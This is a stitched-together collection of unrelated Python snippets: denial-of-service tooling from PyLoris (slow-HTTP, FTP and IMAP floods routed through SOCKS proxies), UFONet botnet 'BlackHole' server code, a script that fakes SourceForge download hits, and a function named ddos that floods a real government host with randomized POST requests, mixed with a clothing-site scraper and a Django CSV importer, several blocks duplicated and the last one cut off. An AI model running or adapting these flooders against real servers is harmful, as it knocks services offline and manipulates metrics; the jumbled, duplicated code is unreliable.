        Label(pf, text = 'Proxy type (SOCKS4/SOCKS5/HTTP/NONE)').grid(row = 0, column = 1)
        Entry(pf, textvariable = self.options['socksversion']).grid(row = 0, column = 2)
        Label(pf, text = 'Proxy Hostname / IP Address').grid(row = 1, column = 1)
        Entry(pf, textvariable = self.options['sockshost']).grid(row = 1, column = 2)
        Label(pf, text = 'Proxy Port').grid(row = 2, column = 1)
        Entry(pf, textvariable = self.options['socksport']).grid(row = 2, column = 2)
        Label(pf, text = 'Proxy Username').grid(row = 3, column = 1)
        Entry(pf, textvariable = self.options['socksuser']).grid(row = 3, column = 2)
        Label(pf, text = 'Proxy Password').grid(row = 4, column = 1)
        Entry(pf, textvariable = self.options['sockspass']).grid(row = 4, column = 2)

        Button(self, text = "Launch", command = self.launch).grid(row = 3, column = 1)

        df = LabelFrame(self, text = 'Request Body', relief = GROOVE, labelanchor = 'nw')
        df.grid(row = 0, column = 2, rowspan = 4)
        self.options['request'] = Text(df, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=NONE, height = 28, width = 80)
        self.options['request'].grid(row = 0, column = 1)
        self.options['request'].insert(END, 'GET / HTTP/1.1\r\nHost: www.example.com\r\nKeep-Alive: 300\r\nConnection: Keep-Alive\r\nReferer: http://www.demonstration.com/\r\n')
        self.options['request'].insert(END, 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1045 Safari/532.5\r\n')
        self.options['request'].insert(END, 'Cookie: data1=' + ('A' * 100) + '&data2=' + ('A' * 100) + '&data3=' + ('A' * 100) + '\r\n')


    def launch(self):
        lorisoptions = DefaultOptions()
        for key in self.options.keys():
            if key == 'request': lorisoptions[key] = self.options[key].get('1.0', END)
            elif key == 'quitimmediately' or key == 'ssl':
                if self.options[key].get() == 0:
                    lorisoptions[key] = False
                else: lorisoptions[key] = self.options[key].get()
            else: lorisoptions[key] = self.options[key].get()

        self.lws.append(LorisWindow('%s:%i' % (lorisoptions['host'], lorisoptions['port']), lorisoptions))

    def checkloop(self):
        thread.start_new_thread(self.check, ())

    def check(self):
        while True:
            for lw in self.lws:
                lw.check()
            time.sleep(1)

class LorisWindow(Toplevel):
    def __init__(self, title, options):
        Toplevel.__init__(self)
        self.title(string = title)
        self.loris = Loris()
        self.loris.LoadOptions(options)
        self.elements = {'attacks' : StringVar(), 'threads' : StringVar(), 'sockets' : StringVar()}
        self.loris.start()

        sf = LabelFrame(self, text = 'Status', width = 180, height = 138)
        sf.grid(row = 0, column = 1)
        sf.grid_propagate(0)
        Label(sf, text = 'Target: %s:%i' % (options['host'], options['port'])).grid(row = 0, column = 1)
        Label(sf, text = 'Attacks: 0', textvar = self.elements['attacks']).grid(row = 1, column = 1)
        Label(sf, text = 'Threads: 0', textvar = self.elements['threads']).grid(row = 2, column = 1)
        Label(sf, text = 'Sockets: 0', textvar = self.elements['sockets']).grid(row = 3, column = 1)
        Button(sf, text = 'Stop Attack', command = self.loris.stop).grid(row = 4, column = 1)

        df = LabelFrame(self, text = 'Log')
        df.grid(row = 0, column = 2)
        self.elements['logs'] = Text(df, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=WORD, height = 8, width = 80)
        self.elements['logs'].grid(row = 0, column = 1)

    def check(self):
        status = self.loris.status()
        self.elements['attacks'].set('Attacks: %i' % (status[0]))
        self.elements['threads'].set('Threads: %i' % (status[1]))
        self.elements['sockets'].set('Sockets: %i' % (status[2]))

        try:
            while True:
                message = self.loris.messages.get(False)
                self.elements['logs'].insert(END, '%s\n' % message)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass

        try:
            while True:
                debug = self.loris.debug.get(False)
                self.elements['logs'].insert(END, '%s\n' % debug)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass

        try:
            while True:
                error = self.loris.errors.get(False)
                self.elements['logs'].insert(END, '[ERROR]: %s\n' % error)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass
            
def main(host, port, filename):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'GET %s HTTP/1.1\r\n' % (host)
    loris.options['request'] += 'Host: %s\r\n' % (filename)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_deflate.py) (http://pyloris.sf.net/)\r\n'
    loris.options['request'] = 'Accept-Encoding: gzip\r\n\r\n'

    loris.options['attacklimit'] = 0
    loris.options['connectionlimit'] = 8
    loris.options['threadlimit'] = 2
    loris.options['timebetweenthreads'] = 0
    loris.options['timebetweenconnections'] = 1
    loris.options['quitimmediately'] = True

    loris.mainloop()
    
def main(host, port, sockshost, socksport):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'USER anonymous\r\n'
    loris.options['request'] += 'PASS anonymous@domain.com\r\n'
    loris.options['request'] += 'A' * (1024 * 1042)

    loris.options['threadlimit'] = 16
    loris.options['connectionlimit'] = 0
    loris.options['timebetweenconnections'] = 0.01

    # Enable SOCKS5 on local port 9050
    loris.options['socksversion'] = 'SOCKS5'
    loris.options['sockshost'] = sockshost
    loris.options['socksport'] = socksport

    loris.mainloop()
    
def main(host, port, sockshost, socksport):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'GET / HTTP/1.1\r\n'
    loris.options['request'] += 'Host: %s\r\n' % (host)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_http.py (http://pyloris.sf.net)\r\n'

    loris.options['threadlimit'] = 25
    loris.options['connectionlimit'] = 256
    loris.options['connectionspeed'] = 15

    # Enable SOCKS5 on local port 9050
    loris.options['socksversion'] = 'SOCKS5'
    loris.options['sockshost'] = sockshost
    loris.options['socksport'] = socksport

    loris.mainloop()
    
def main(host, port):
    # Instantiate the ScriptLoris object
    loris = ScriptLoris()

    # Set the connection  options
    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['threadlimit'] = 25
    loris.options['connectionlimit'] = 256
    loris.options['connectionspeed'] = 15

    # Build the HTTP request body
    loris.options['request'] = 'GET / HTTP/1.1\r\n'
    loris.options['request'] += 'Host: %s\r\n' % (host)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_http.py (http://pyloris.sf.net)\r\n'
    loris.options['request'] += 'A' * 1024 * 1024

    # Launch the attack
    loris.mainloop()
    
def main(host, port):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['ssl'] = True

    loris.options['threadlimit'] = 64
    loris.options['connectionlimit'] = 4092
    loris.options['connectionspeed'] = 1

    loris.options['request'] = ''
    for i in range(1000):
        loris.options['request'] += 'a%02i CAPABILITY\n' % (i)

    loris.mainloop()
    
def main(projectname, downloadrefer, downloadmirror, downloadhost1, downloadhost2, downloadfile,
        downloadevery, headevery, pagehitevery, logohitevery, useragent, sockshost, socksport):
    options = DefaultOptions()
    options['referer'] = '%s.sourceforge.net/projects/%s/files/%s/download' % (projectname, projectname, downloadfile)
    options['host'] = downloadhost1
    options['port'] = 80
    options['connectionspeed'] = 0
    options['timebetweenconnections'] = downloadevery
    options['threadlimit'] = 1
    options['connectionlimit'] = 1
    options['socksversion'] = 'SOCKS5'
    options['sockshost'] = sockshost
    options['socksport'] = socksport
    options['request'] = 'GET %s?use_mirror=%s HTTP/1.1\r\n' %(downloadfile, downloadmirror)
    options['request'] += 'Host: %s\r\n' % (downloadhost1)
    options['request'] += 'Referer: %s\r\n' % (downloadrefer)
    options['request'] += 'User-Agent: %s\r\n\r\n' %(useragent)

    loris1 = ScriptLoris()
    loris1.LoadOptions(options)
    loris1.start()

    options['host'] = downloadhost2
    options['request'] = 'GET %s HTTP/1.1\r\n' % (downloadfile)
    options['request'] += 'Host: %s\r\n' % (downloadhost2)
    options['request'] += 'Referer: %s\r\n' % (downloadrefer)
    options['request'] += 'User-Agent: %s\r\n\r\n' % (useragent)

    loris2 = ScriptLoris()
    loris2.LoadOptions(options)
    loris2.start()

    options['host'] = '%s.sourceforge.net' % (projectname)
    options['request'] = 'HEAD / HTTP/1.1\r\n'
    options['request'] += 'Host: %s.sourceforge.net\r\n' % (projectname)
    options['request'] += 'User-Agent: %s\r\n\r\n' % (useragent)
    options['timebetweenconnections'] = headevery

    loris3 = ScriptLoris()
    loris3.LoadOptions(options)
    loris3.start()

    options['request'] = 'GET / HTTP/1.1\r\n'
    options['request'] += 'Host: %s.sourceforge.net\r\n' % (projectname)
    options['request'] += 'User-Agent: %s\r\n\r\n' % (useragent)
    options['timebetweenconnections'] = pagehitevery

    loris4 = ScriptLoris()
    loris4.LoadOptions(options)
    loris4.start()

    options['host'] = 'sflogo.sourceforge.net'
    options['request'] = 'GET /sflogo.php?group_id=266347&type=12 HTTP/1.1\r\n'
    options['request'] += 'Host: %sflogo.sourceforge.net\r\n'
    options['request'] += 'User-Agent: %s\r\n\r\n' % (useragent)
    options['timebetweenconnections'] = logohitevery

    loris5 = ScriptLoris()
    loris5.LoadOptions(options)
    loris5.start()
class BlackHole (  ):
    def __init__(self):
        Thread.__init__( self )
        self.daemon = True
        self.awake = True
        self.tmp_dir = "/tmp/"
        self.target_dir = '/var/www/ufonet/' 
        self.blackray = None
        self.absorber = None
        self.computer = None

    def dream(self):
        if not os.path.exists(self.target_dir+"abductions.txt.gz"):
            abductions_fail = 0
            try:
                fc = gzip.open(self.target_dir+'abductions.txt.gz', 'wb')
                fc.close()
            except:
                print "[Error] not abductions.txt.gz file in "+self.target_dir
                abductions_fail = abductions_fail + 1
        else:
            abductions_fail = 0
        if not os.path.exists(self.target_dir+"troops.txt.gz"):
            troops_fail = 0
            try:
                fc = gzip.open(self.target_dir+'troops.txt.gz', 'wb')
                fc.close()
            except:
                print "[Error] not troops.txt.gz file in "+self.target_dir
                troops_fail = troops_fail + 1
        else:
            troops_fail = 0
        if not os.path.exists(self.target_dir+"robots.txt.gz"):
            robots_fail = 0
            try:
                fc = gzip.open(self.target_dir+'robots.txt.gz', 'wb')
                fc.close()
            except:
                print "[Error] not robots.txt.gz file in "+self.target_dir
                robots_fail = robots_fail + 1
        else:
            robots_fail = 0
        if not os.path.exists(self.target_dir+"drones.txt.gz"):
            drones_fail = 0
            try:
                fc = gzip.open(self.target_dir+'drones.txt.gz', 'wb')
                fc.close()
            except:
                print "[Error] not drones.txt.gz file in "+self.target_dir
                drones_fail = drones_fail + 1
        else:
            drones_fail = 0
        if not os.access(self.target_dir+"abductions.txt.gz",os.W_OK):
            print "[Error] write access denied for abductions file in "+self.target_dir
            abductions_fail = abductions_fail + 1
        if not os.access(self.target_dir+"troops.txt.gz",os.W_OK):
            print "[Error] write access denied for troops file in "+self.target_dir
            troops_fail = troops_fail + 1
        if not os.access(self.target_dir+"robots.txt.gz",os.W_OK):
            print "[Error] write access denied for robots file in "+self.target_dir
            robots_fail = robots_fail + 1
        if not os.access(self.target_dir+"drones.txt.gz",os.W_OK):
            print "[Error] write access denied for drones file in "+self.target_dir
            drones_fail = drones_fail + 1
        if abductions_fail > 0 and troops_fail > 0 and robots_fail > 0 and drones_fail > 0:
            print "[Error] cannot found any zombies container. Aborting..."
            print "[Info] suspend blackhole with: Ctrl+z"
            sys.exit(2)
        if self.consume():
            os.mkdir(self.tmp_dir + "blackhole")
        else:
            print "[Blackhole Error] unable to consume in "+self.tmp_dir+"blackhole..."
            sys.exit(2)
        if not os.path.isdir(self.tmp_dir + "blackhole"):
            print "[Blackhole Error] unable to create "+self.tmp_dir+"blackhole..."
            sys.exit(2)
        self.blackray = BlackRay(self)
        self.absorber = Absorber(self)
        self.computer = Computer(self)
        self.awake = False
        print "[Blackhole] Having sweet dreams..."

    def consume(self):
        if os.path.isdir(self.tmp_dir + "blackhole"):
            try:
                shutil.rmtree(self.tmp_dir + "blackhole")
            except OSError, e:
                print "[Blackhole Error] unable to consume : " + str(e)
                return False
        return True

    def try_bind(self, port):
        s=None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.bind(('', port))
        except socket.error as e:
            if e.errno == 98: # if is in use wait a bit and retry
                time.sleep(3)
                return self.try_bind(port)
            print("[Blackhole Warning] socket busy, connection failed on port " + str(port))
        return s

    def run(self):
        self.dream()
        try:
            self.blackray.start()
            self.absorber.start()
            self.computer.start()
            if not self.blackray.shining or self.absorber.overflow or not self.computer.power_on:
                print "[BlackHole] Advancing time in another space (waiting for server)"+os.linesep
                time.sleep(1)
            while not self.blackray.shining or self.absorber.overflow or not self.computer.power_on:
                time.sleep(1)
            print "\n[BlackHole] all up and running"
            while self.blackray.shining and not self.absorber.overflow and self.computer.power_on:
                time.sleep(1)
        except:
            traceback.print_exc()
        self.awaken()
        print "[Blackhole] Lifespan is up..."

    def collapse(self):
        self.blackray.shining = False
        self.absorber.overflow = True
        self.computer.power_on = False
        self.computer.join()
        self.blackray.join()
        self.absorber.join()

    def awaken(self):
        self.consume()
        self.collapse()
        self.awake = True										
class UdpThread(Thread):
    def __init__(self, udpserver, data, addr, logger):
        Thread.__init__(self)
        self.__server__ = udpserver
        self.__id__ = uuid.uuid4()
        self.__data__ = data
        self.__addr__ = addr
        self.__logger__ = logger
    
    def run(self):
        self.__logger__.info('server thread %s' % self.__id__)
        self.__logger__.info('work for %s:%s' % self.__addr__)
        
        while True:
            if self.__data__ != None:
                response = ('[Response] - ' + self.__data__)
                self.__server__.sendto(response, self.__addr__)
                break
        
        self.__logger__.info('complete')	
		
class extended_thread(Thread):
    PORT = None
    HOST = ''
    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((self.HOST, self.PORT))
            s.listen(1)
            s.settimeout(120)
            conn, addr = s.accept()
            print 'Connected by', addr
            while 1:
                data = conn.recv(1024)
                if not data: break
                conn.sendall(data)
            conn.close()
            server_welcome.socket_success.append(self.PORT)
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.PORT) + " timed out after two minutes."
            server_welcome.local_socket_exceptions.append(self.PORT)
        except socket.error as msg:
            s.close()
            s = None
            server_welcome.local_socket_exceptions.append(self.PORT)
			
class handshake():
 
    def __init__(self, ports):
        self.target_port = 60100
        self.received_port_list = []
        self.local_port_list = ports
        self.local_socket_exceptions = []
        self.remote_socket_exceptions = []
        self.socket_success = []
 
    def server_shake(self, payload):
        try:
            if self.target_port <= 60200:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('', self.target_port))
                s.listen(1)
                s.settimeout(120)
                conn, addr = s.accept()
                while 1:
                    print "Receiving data..."
                    data = conn.recv(1024)
                    print "sending data..."
                    conn.sendall(str(payload))
                    break
                conn.close()
                return list(data)
            else:
                print "I never heard from the client, or I couldn't secure a port."
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.target_port) + " timed out after two minutes."
        except socket.error as msg:
            s.close()
            s = None
            self.target_port += 1
            self.server_shake(payload)
   
    def client_shake(self, payload):
        try:
            if self.target_port <= 60200:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((args.host, self.target_port))
                s.settimeout(120)
                print "Sending data..."
                s.sendall(str(payload))
                print "Receiving data..."
                data = s.recv(1024)
                s.close()
                return list(data)
            else:
                print "I never heard from the server, or I couldn't secure a port."
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.target_port) + " timed out after two minutes."
        except socket.error as msg:
            s.close()
            s = None
            self.target_port += 1
            self.client_shake(payload)
   
    def port_diff(self, local_ports, received_ports):
        return set(local_ports).symmetric_difference_update(set(received_ports))	
		
class UDPProxy():
    def __init__(self, local_port, dst_addr):
        """
        portmap is in format as: 623: ['10.128.20.41', 623]
        """
        pool = Pool(10)
        super(UDPProxy, self).__init__(local_port, spawn=pool)
        self.reuse_addr = None
        self.dst_addr = dst_addr

    def handle(self, data, addr):
        sock_dst = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if not data:
            logger.error('an error occured')
            return
        logger.debug('received: {0!r} from {1}.'.format(data, addr))
        sock_dst.sendto(data, self.dst_addr)
        logger.debug('send: {0!r} to {1}.'.format(data, self.dst_addr))
        data, _ = sock_dst.recvfrom(65565)
        self.socket.sendto(data, addr)

class ServerPack(object):
    def __init__(self, servers):
        self.servers = servers
        self._stop_event = Event()
        self._stop_event.set()

    def start(self):
        self._stop_event.clear()
        started = []
        try:
            for server in self.servers[:]:
                server.start()
                started.append(server)
                name = getattr(server, 'name', None) or server.__class__.__name__ or 'Server'
                logger.info('%s started on %s', name, server.address)
        except:
            self.stop(started)
            raise
        self._stop_event.wait()

    def stop(self, servers=None):
        self._stop_event.set()
        if servers is None:
            servers = self.servers[:]
        for server in servers:
            try:
                server.stop()
            except:
                if hasattr(server, 'loop'):  # gevent >= 1.0
                    server.loop.handle_error(server.stop, *sys.exc_info())
                else:  # gevent <= 0.13
                    import traceback
                    traceback.print_exc()									
class handshake():
 
    def __init__(self, ports):
        self.target_port = 60100
        self.received_port_list = []
        self.local_port_list = ports
        self.local_socket_exceptions = []
        self.remote_socket_exceptions = []
        self.socket_success = []
 
    def server_shake(self, payload):
        try:
            if self.target_port <= 60200:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('', self.target_port))
                s.listen(1)
                s.settimeout(120)
                conn, addr = s.accept()
                while 1:
                    print "Receiving data..."
                    data = conn.recv(1024)
                    print "sending data..."
                    conn.sendall(str(payload))
                    break
                conn.close()
                return list(data)
            else:
                print "I never heard from the client, or I couldn't secure a port."
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.target_port) + " timed out after two minutes."
        except socket.error as msg:
            s.close()
            s = None
            self.target_port += 1
            self.server_shake(payload)
   
    def client_shake(self, payload):
        try:
            if self.target_port <= 60200:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((args.host, self.target_port))
                s.settimeout(120)
                print "Sending data..."
                s.sendall(str(payload))
                print "Receiving data..."
                data = s.recv(1024)
                s.close()
                return list(data)
            else:
                print "I never heard from the server, or I couldn't secure a port."
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.target_port) + " timed out after two minutes."
        except socket.error as msg:
            s.close()
            s = None
            self.target_port += 1
            self.client_shake(payload)
   
    def port_diff(self, local_ports, received_ports):
        return set(local_ports).symmetric_difference_update(set(received_ports))	
def parse_item(self, response) :
        sel = Selector (response)
        items = []
        item = ZaraItem ()
        item['url'] = response.request.url
        title = sel.xpath ('//div[@class="right"]//header/h1//text()').extract()
        if title :
                item['title'] = title
        item['ref'] = sel.xpath ('//p[@class="reference"]//text()').extract()
        item['price'] = sel.xpath ('//p[@class="price"]/span[@class="price"]/@data-price').extract()
        desc = sel.xpath ('//p[@class="description"]/text()').extract()
        if desc :
                item['desc'] = desc
        item['img'] = sel.xpath ('//div[@class="imgCont"]//img/@src').extract()
        item['img_color'] = sel.xpath ('//span/i[@class="icon icon-arrow-down-color"]//text()').extract()
        if item['title'] and item['ref'] :
                return item						

def import_file(request, pk):
    mensaje = ''
    context = locals()
    if request.method == 'POST':
        try:
            file = request.FILES['archivo']
            dataReader = csv.DictReader(file, delimiter=';')
            if (pk=='1'):
                for x in dataReader:
                    modelo = EERR()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.kilo = transformarKilos(x['Kilos'])
                    modelo.venta = transformarPrecios(x['Venta'])
                    modelo.ingreso = transformarPrecios(x['Total Ingresos'])
                    modelo.gasto = transformarPrecios(x['Total Gastos'])
                    modelo.margen_peso = transformarPrecios(x['Margen'])
                    modelo.margen_porc = float(transformarPorcentajes(x['Margen %'])) / 100
                    modelo.save()
                    mensaje = 'El reporte Estado de Resultado, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 1)
            elif (pk=='2'):
                for x in dataReader:
                    modelo = Kilos()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.kilos = transformarKilos(x['Kilos Venta'])
                    modelo.save()
                    mensaje = 'El reporte Kilos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 2)
            elif (pk=='3'):
                for x in dataReader:
                    modelo = PrecioPromedio()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.sector_id = x['Sector']
                    modelo.kilo = transformarKilos(x['Kilos Venta'])
                    modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.save()
                    mensaje = 'El reporte Precio Promedio vs Zona, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 3)
            elif (pk=='4'):
                for x in dataReader:
                    modelo = Descuento()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de Cliente']
                    modelo.sector_id = x['Sector']
                    modelo.cadena_id = x['Cadena']
                    modelo.rut = x['Rut']
                    modelo.tipoPedido = x['Tipo Pedido']
                    if (x['Kilos  Facturados'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos  Facturados'])
                    if (x['P.Base'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.base = transformarKilosSinKG(x['P.Base'])
                    if (x['P.Especial'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.especial = transformarKilosSinKG(x['P.Especial'])
                    if (x['P.Vigente'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.vigente = transformarKilosSinKG(x['P.Vigente'])
                    if (x['P.Pedido'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.pedido = transformarKilosSinKG(x['P.Pedido'])
                    if (x['P.Facturado'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.facturado = transformarKilosSinKG(x['P.Facturado'])
                    modelo.save()
                    mensaje = 'El reporte Precios y Descuentos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 4)
            elif (pk=='5'):
                for x in dataReader:
                    modelo = Gasto()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.clasecoste_id = x['Clase de coste']
                    if x['Monto'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.gasto = transformarPrecios(x['Monto'])
                    modelo.save()
                    mensaje = 'El reporte Costos Unitarios, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 5)
            elif (pk=='6'):
                for x in dataReader:
                    modelo = VentaCompleta()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.cliente = x['Cod Local']
                    modelo.categoria_id = x['Categoria Cliente']
                    modelo.fecha = transformarFechas(x['Dia natural'])
                    modelo.supervisor = x['Supervisor_BP-CL']
                    modelo.preventa = x['Preventa_BP-CL']
                    if x['Unidades Venta'] == '':
                        modelo.unidad = 0
                    else:
                        modelo.unidad = transformarNetos(x['Unidades Venta'])
                    if x['Kilos Venta'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos Venta'])
                    if x['Venta Neta'] == '':
                        modelo.neto = 0
                    else:
                        modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.codigoMaterial = x['Cod Material']
                    modelo.material = x['Material']
                    modelo.nivel2 = x['Nivel 2']
                    modelo.nivel3 = x['Nivel 3']
                    modelo.marca = x['Marca']
                    modelo.referencia = x['Referencia']
                    modelo.save()
                    mensaje = 'El reporte Formula de Ingreso, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 6)
            else:
                mensaje = 'Este importe no ha sido programado'
        except Exception, e:
            mensaje = 'Ha ocurrido un error interno, por favor vuelva a intentarlo: ' + str(e)
            print(str(e))
    return render(request, 'imports/success_import.html', {'mensaje': mensaje, 'context': context})		
def ddos(name):
  try:
    while True:
      baundary=str(random.choice(boundares))
      p="---"+baundary+"\r\n"
      p+="Content-Disposition: form-data; name=\"act\"\r\n\r\n"
      p+="search\r\n"
      p+="---"+baundary+"\r\n"
      p+="Content-Disposition: form-data; name=\"secretcodeId\"\r\n\r\n"
      p+=str(random.choice(blocklist))+"\r\n"
      p+="---"+baundary+"\r\n"
      p+="Content-Disposition: form-data; name=\"searchstring\"\r\n\r\n"
      p+=str(random.choice(blocklist))+"\r\n"
      p+="---"+baundary+"\r\n"
      p+="Content-Disposition: form-data; name=\"secretcodestatus\"\r\n\r\n"
      p+=str(random.choice(codes))+"\r\n"
      rq="POST / HTTP/1.1\r\n"
      rq+="Host: eais.rkn.gov.ru\r\n"
      rq+="Content-Type: multipart/form-data; boundary=---"+baundary+"\r\n"
      rq+="Content-Length: "+str(len(p))+"\r\n"
      rq+="User-Agent: "+str(random.choice(blocklist))+"\r\n"
      rq+="Connection: close\r\n\r\n"+p
      sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      sock.connect(("eais.rkn.gov.ru",80))
      sock.send(rq)
      print "Posting "+name+"..."
      #print sock.recv(2050)
      #sock.close()
  except:
    print "Thread broken. Restarting ..."
    time.sleep(2)
    ddos(name)
def port_forwarder(host, port,loop):
    @asyncio.coroutine
    def forward(local_reader, local_writer):
        client = local_writer.get_extra_info('peername')
        info('connected client %s %s', *client)
        remote_reader, remote_writer = yield asyncio.open_connection(host, port, loop=loop)
        yield asyncio.wait([copy_stream(local_reader, remote_writer),
                                 copy_stream(remote_reader, local_writer)],
                                loop=loop)
        info('disconnected client %s %s', *client)
    return forward
def parse_item(self, response) :
        sel = Selector (response)
        items = []
        item = ZaraItem ()
        item['url'] = response.request.url
        title = sel.xpath ('//div[@class="right"]//header/h1//text()').extract()
        if title :
                item['title'] = title
        item['ref'] = sel.xpath ('//p[@class="reference"]//text()').extract()
        item['price'] = sel.xpath ('//p[@class="price"]/span[@class="price"]/@data-price').extract()
        desc = sel.xpath ('//p[@class="description"]/text()').extract()
        if desc :
                item['desc'] = desc
        item['img'] = sel.xpath ('//div[@class="imgCont"]//img/@src').extract()
        item['img_color'] = sel.xpath ('//span/i[@class="icon icon-arrow-down-color"]//text()').extract()
        if item['title'] and item['ref'] :
                return item						

def import_file(request, pk):
    mensaje = ''
    context = locals()
    if request.method == 'POST':
        try:
            file = request.FILES['archivo']
            dataReader = csv.DictReader(file, delimiter=';')
            if (pk=='1'):
                for x in dataReader:
                    modelo = EERR()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.kilo = transformarKilos(x['Kilos'])
                    modelo.venta = transformarPrecios(x['Venta'])
                    modelo.ingreso = transformarPrecios(x['Total Ingresos'])
                    modelo.gasto = transformarPrecios(x['Total Gastos'])
                    modelo.margen_peso = transformarPrecios(x['Margen'])
                    modelo.margen_porc = float(transformarPorcentajes(x['Margen %'])) / 100
                    modelo.save()
                    mensaje = 'El reporte Estado de Resultado, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 1)
            elif (pk=='2'):
                for x in dataReader:
                    modelo = Kilos()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.kilos = transformarKilos(x['Kilos Venta'])
                    modelo.save()
                    mensaje = 'El reporte Kilos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 2)
            elif (pk=='3'):
                for x in dataReader:
                    modelo = PrecioPromedio()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.sector_id = x['Sector']
                    modelo.kilo = transformarKilos(x['Kilos Venta'])
                    modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.save()
                    mensaje = 'El reporte Precio Promedio vs Zona, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 3)
            elif (pk=='4'):
                for x in dataReader:
                    modelo = Descuento()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de Cliente']
                    modelo.sector_id = x['Sector']
                    modelo.cadena_id = x['Cadena']
                    modelo.rut = x['Rut']
                    modelo.tipoPedido = x['Tipo Pedido']
                    if (x['Kilos  Facturados'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos  Facturados'])
                    if (x['P.Base'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.base = transformarKilosSinKG(x['P.Base'])
                    if (x['P.Especial'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.especial = transformarKilosSinKG(x['P.Especial'])
                    if (x['P.Vigente'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.vigente = transformarKilosSinKG(x['P.Vigente'])
                    if (x['P.Pedido'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.pedido = transformarKilosSinKG(x['P.Pedido'])
                    if (x['P.Facturado'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.facturado = transformarKilosSinKG(x['P.Facturado'])
                    modelo.save()
                    mensaje = 'El reporte Precios y Descuentos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 4)
            elif (pk=='5'):
                for x in dataReader:
                    modelo = Gasto()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.clasecoste_id = x['Clase de coste']
                    if x['Monto'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.gasto = transformarPrecios(x['Monto'])
                    modelo.save()
